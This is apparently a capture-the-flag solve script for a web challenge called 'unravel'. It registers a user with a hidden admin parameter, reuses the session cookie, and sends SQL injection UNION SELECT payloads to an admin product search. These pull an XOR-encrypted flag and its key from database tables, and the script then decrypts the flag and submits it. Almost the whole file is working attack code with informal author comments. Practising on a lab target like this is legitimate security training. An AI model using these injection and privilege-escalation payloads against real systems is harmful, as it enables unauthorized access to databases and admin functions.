import requests

url = "https://uscybercombine-s4-unravel.chals.io"
submit_url = "/api/submit_flag"

def repeat_key_xor(plain, key): # take in bytes
    output = b''
    mod = len(key)
    i = 0
    for byte in plain:
        output += bytes([byte ^ key[i]])
        i = (i + 1) % mod
    return output

username = "urmom"

register_url = "/register"
registration_data = {
    "username" : username,
    "password" : "c26ab7f72db3018d",
    "secret_param" : "admin_secret"
}
# print(requests.post(url + register_url, data=registration_data).text)
# quit()

login_url = "/login"
login_data = {
    "username" : username,
    "password" : "c26ab7f72db3018d"
}
response = requests.post(url + login_url, data=login_data)
session = response.headers['Set-Cookie'].rstrip("; HttpOnly; Path=/").lstrip("session").lstrip("=")
# BRO I'M SO STUPID THE COOKIE EVERY SESSION STARTED WITH AN E SO LSTRIP WAS CUTTING IT AND I WAS GETTING THE WRONG COOKIE
cookies = { "session" : session }


sql_query_1 = "/admin/products?search=widget' UNION SELECT NULL,xor_encrypted_flag,NULL,NULL FROM xord_flag--"
params = {
    "search" : "widget' UNION SELECT NULL,xor_encrypted_flag,NULL,NULL FROM xord_flag--"
}
flag_url = "/admin/products"
xored_flag = requests.get(url + flag_url, cookies=cookies, params=params).text.split("<h3>")[1].split("</h3>")[0]


sql_query = "/admin/products?search=widget' UNION SELECT NULL,key,NULL,NULL FROM xor_encryption_key--"
params = {
    "search" : "widget' UNION SELECT NULL,key,NULL,NULL FROM xor_encryption_key--"
}
encryption_key = requests.get(url + flag_url, cookies=cookies, params=params).text.split("<h3>")[1].split("</h3>")[0]

unravel = repeat_key_xor(bytes.fromhex(xored_flag), encryption_key.encode()).decode()
# the actual hardest part of this challenge was figuring out that the key wasn't decoded from hex smh. It's just itself encoded
key = "decrypted_flag"
print(unravel)

data = { key : unravel }

response = requests.post(url + submit_url, json=data)

print(response.text)